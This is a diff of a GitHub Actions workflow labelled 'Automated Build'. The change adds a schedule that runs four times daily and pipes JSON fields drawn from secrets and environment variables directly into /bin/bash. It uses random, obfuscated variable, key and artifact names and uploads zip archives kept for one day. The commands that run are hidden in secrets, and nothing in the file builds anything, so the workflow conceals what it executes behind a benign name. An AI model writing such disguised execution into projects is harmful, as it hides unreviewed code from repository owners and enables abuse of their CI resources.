@@ -2,6 +2,8 @@ name: Automated Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '40 5,11,17,23 * * *'
 jobs:
   launch:
     runs-on: ubuntu-latest
@@ -13,17 +15,16 @@ jobs:
           fetch-depth: 1
       - name: Do work
         env:
-          oiwm864: ${{ secrets.oiwm864 }}
+          izj285: ${{ secrets.izj285 }}
         run: |
-          printf '%s' "$oiwm864" | jq -r .bw379 | /bin/bash
-          printf '%s' "$jrxg217" | jq -r .fi55998 | /bin/bash
-          printf '%s' "$ptzrc30435" | jq -r .iqjjv35 | /bin/bash
-          printf '%s' "$wncja655" | jq -r .du9478 | /bin/bash
-          printf '%s' "$pkq7010" | jq -r .jlm588 | /bin/bash
+          printf '%s' "$izj285" | jq -r .p8 | /bin/bash
+          echo $zzb57754 | jq -r .xmcam4371 | /bin/bash
+          echo $kb648 | jq -r .tczlx91 | /bin/bash
+          echo $dkdlj73 | jq -r .vd80467 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
         with:
-          name: u2AXZHWn
+          name: 2pGPjyYz
           path: "*.zip"
           retention-days: 1
